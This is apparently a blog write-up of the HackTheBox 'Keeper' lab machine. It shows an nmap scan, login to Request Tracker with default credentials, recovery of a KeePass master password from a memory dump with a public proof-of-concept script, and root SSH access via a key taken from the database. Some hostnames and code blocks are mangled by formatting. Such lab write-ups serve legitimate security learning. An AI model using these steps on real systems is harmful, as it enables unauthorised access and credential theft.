---
title: "Keeper"
description: ""
pubDate: "Jul 15 2022"
heroImage: "/Keeper/keeper.webp"
---

**Difficulty:**

Easy

**OS:**

Linux## Introduction Keeper is an easy-level HackTheBox laboratory machine running Linux. It involves various tasks, including identifying a standard password, exploring password transmission through an open communication channel, encountering an untimely change, and exploiting a vulnerability in Keepass.## Nmap

```bash
shellnmap -A -T4 -p- 10.129.208.9``````PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Site doesn't have a title (text/html).No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.93%E=4%D=8/16%OT=22%CT=1%CU=33068%PV=Y%DS=2%DC=T%G=Y%TM=64DCC1DOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQOS:(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)OPS(O1=M569ST11NW7%O2=M569ST11NW7%OOS:3=M569NNT11NW7%O4=M569ST11NW7%O5=M569ST11NW7%O6=M569ST11)WIN(W1=FE88%W2=OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M569NNSNOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%OOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=NOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%COS:D=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 110/tcp)HOP RTT       ADDRESS1   351.44 ms 10.10.16.1 (10.10.16.1)2   158.05 ms 10.129.208.9 (10.129.208.9)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1125.60 seconds
```

## User FlagWe have two open ports:

```bash
shell22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Site doesn't have a title (text/html).
```

Upon accessing Port 80, we encounter a hostname. We can add this hostname to the hosts file using the command:

```bash
shellsudo nano /etc/hosts<Ip address> /Keeper/.htb tickets./Keeper/.htb
```

The discovered website is a Request Tracker instance, and default credentials grant access to a user named “lnorgaard.”

![](/Keeper/Untitled.png)

![](/Keeper/Untitled%201.png)

Clicking on “lnorgaard” provides Unix Login access, allowing SSH access.

![](/Keeper/Untitled%202.png)

We successfully login via SSH.

![](/Keeper/Untitled%203.png)

## Root FlagA zip file is found in the home directory, which is extracted. Two files are extracted, and research on Keepass vulnerabilities leads to the discovery of a potential plain text password retrieval method using a Linux script from

[https://github.com/CMEPW/keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey)

.Using the script, we attempt to retrieve the password:

```bash
shellpython3 poc.py -d KeePassDumpFull.dmp
```

This results in a potential password. Further investigation and testing lead us to a working password:

```bash
plaintextrødgrød med fløde
```

Using Keepass and the database found in the zip file, we enter the password and gain access to the database.

![](/Keeper/Untitled%204.png)

Within the database, an SSH-RSA key is found, imported into Puttygen, and a new SSH key is generated. The generated key is used for SSH access:

```bash
shellchmod 600 root_rsassh -i root_rsa root@/Keeper/.htb
```

This grants us root access.## ConclusionThe /Keeper/ HackTheBox machine provided an opportunity to explore various aspects of penetration testing, including port scanning, identifying vulnerabilities, exploiting Keepass vulnerabilities, and escalating privileges to root.This writeup offers a comprehensive overview of the steps taken to conquer this machine, serving as a valuable reference for those interested in the field of ethical hacking and penetration testing.Happy hacking!